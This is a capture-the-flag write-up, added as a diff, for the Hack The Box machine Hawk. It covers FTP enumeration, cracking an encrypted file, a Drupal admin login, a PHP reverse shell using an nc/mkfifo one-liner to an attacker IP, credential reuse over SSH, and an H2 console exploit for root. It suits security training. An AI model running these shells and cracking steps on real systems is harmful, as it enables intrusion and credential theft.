@@ -1,0 +1,107 @@
+HTB-Hawk-Writeup
+
+IP : 10.10.10.102
+
+Nmap
+----
+- nmap scan gave us 5 open ports 
+	- 21 running FTP
+	- 22 running SSH
+	- 80 running Apache httpd 2.4.29
+	- 5435 running tcpwrapped
+	- 8082 running H2 console
+	- 9092 running XmlIpcRegSvc
+
+- FTP anonymous login is allowed 
+
+Enumeration
+-----------
+- check out the site at port 80 and we got ourselves a drupal login page 
+- we can check for drupalgeddon2 vulnerability based on the time of release of the box but it turns out that the drupal version used in here is 7.58 which is a version that patched this vulnerability
+
+	ruby drupalgeddon2.rb http://10.10.10.102/
+
+- directory brute forcing doesnt give us anythin useful 
+- we scanned with droopscan for vulnerability but didnt find anything interesting enough
+
+	droopescan scan drupal -u http://10.10.10.102
+
+- visiting the H2 console located at 8082 we can see a note saying that it has desabled non localhost connections   
+- checking out FTP , logging in to FTP via anonymous login
+	
+	ftp 10.10.10.102
+
+- we list the files with ls -a (hidden files)
+- we got a file named .drupal.txt.enc, download it to our system
+- the above file is openssl encoded data with salted password and also base64 encoded 
+- we can base64 decode it and safe it to a file
+
+	base64 -d .drupal.txt.enc > drupal_ssl
+
+- after checking with file it says openssl encrypted data with salted password 
+- we can decrypt this openssl file with bruteforce-salted-openssl
+
+	bruteforce-salted-openssl -t 6 -f usr/share/wordlists/rockyou.txt drupal_ssl -c aes-256-cbc -d sha256 
+
+- we got the password candidate which is friends, we can use this password to decrypt the openssl file and extract the contents   
+
+	openssl enc -d -aes256 -md sha256 -salt -in drupal_ssl -out drupal_decrypt -k friends 
+
+- on checking the decrypted contents we get credentials
+
+	creds : PencilKeyboardScanner123
+
+- we tried this password for the admin user in the drupal login page on port 80 and got logged in 
+- now with access we can change the settings to allow PHP execution in posts by checking PHP filter
+- now we can add new contents as PHP code 
+
+	Add Content > Basic Page
+
+- we can add a new basic page and post a PHP reverse shell in it to get a shell on the box
+
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+	<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 9001 >/tmp/f");?>
+
+- start a listener with netcat
+
+	nc -lnvp 9001
+
+- we got a shell as www-data
+- grab the user flag 
+
+WWW-data -> Daniel
+------------------
+- we can checkout the database configuration file located at /var/www/html/sites/default/settings.php
+- we got a new password from this 
+
+	creds : drupal : drupal4hawk
+	
+- this password actually works for daniel too
+
+	creds : daniel : drupal4hawk
+
+- we can SSH into the box with the credentials as daniel
+
+	ssh daniel@10.10.10.102
+
+- we are dropped into a python3 interpreter instead of a bash shell
+- this is because if we look at /etc/passwd file we notice that the user has /usr/bin/python3 set as user shell
+- run the following command and we will get a regular bash shell
+
+	import pty;pty.spawn('/bin/bash')
+
+- we got shell as daniel
+
+Priv-esc
+--------
+- we know that there is an H2 database service running on port 8082
+- searching for exploits on google we get an exploit in exploit-db website 
+- we can download it as exploit.py 
+- make necessary changes to the exploit and upload it to the victim machine 
+- run the exploit 
+
+	python3 exploit.py -H 127.0.0.1:8082
+
+- and we got a shell as root 
+- grab the root flag 
